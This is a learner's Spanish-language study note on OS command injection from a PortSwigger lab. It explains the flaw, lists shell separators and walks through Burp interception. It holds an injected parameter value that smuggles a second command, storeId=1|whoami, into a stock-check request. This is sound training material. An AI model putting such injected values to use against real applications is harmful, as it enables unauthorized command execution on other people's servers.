# 06 — OS Command Injection

> **Método de estudio:** workflow oficial de PortSwigger Web Security Academy primero. Blind command injection y técnicas Practitioner se estudiarán en su etapa correspondiente.

## Estado del bloque

✅ **OS Command Injection — Apprentice completado.**

PortSwigger incluye 5 elementos en este bloque y 1 laboratorio Apprentice.

---

# Qué es OS command injection

Ocurre cuando una aplicación incorpora datos controlados por el usuario dentro de un comando del sistema operativo de forma insegura.

```text
entrada HTTP
→ aplicación construye comando del SO
→ shell interpreta metacaracteres
→ se ejecuta un comando adicional
```

Ejemplo del lab:

```text
storeId=1|whoami
```

Conceptualmente puede provocar algo parecido a:

```text
stockreport.pl 1 1 | whoami
```

---

# Lab — OS command injection, simple case ✅

> [Procedimiento completo](../Labs/OS-Command-Injection/01-OS-command-injection-simple-case.md)

## Objetivo

Ejecutar:

```text
whoami
```

a través de **Check stock** y observar el usuario del proceso del servidor.

## Request relevante

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

## Modificación oficial

```text
storeId=1|whoami
```

## Resultado aprendido

```text
POST /product/stock
→ storeId controlado
→ | separa/encadena comandos
→ whoami se ejecuta en el servidor
→ la salida aparece en la Response
```

Esto es **in-band command injection** porque la salida del comando se devuelve directamente en la respuesta HTTP.

---

# Separadores importantes

PortSwigger introduce, según shell/contexto:

```text
&
&&
|
||
;
newline
`command`
$(command)
```

Para este lab usamos únicamente `|`.

---

# Burp practicado

```text
Browser → producto → Check stock
Proxy → Intercept ON
POST /product/stock
modificar storeId
Forward
observar Response
```

---

# Checklist Apprentice

- [x] Puedo explicar qué es OS command injection.
- [x] Entiendo que el servidor ejecuta un comando del sistema operativo.
- [x] Entiendo el papel de `|`.
- [x] Sé localizar `POST /product/stock`.
- [x] Sé identificar y modificar `storeId`.
- [x] Reconozco la salida de `whoami`.
- [x] Lab completado.

# Regla rápida

**Datos de una request HTTP terminan siendo interpretados como sintaxis por el shell del sistema operativo.**
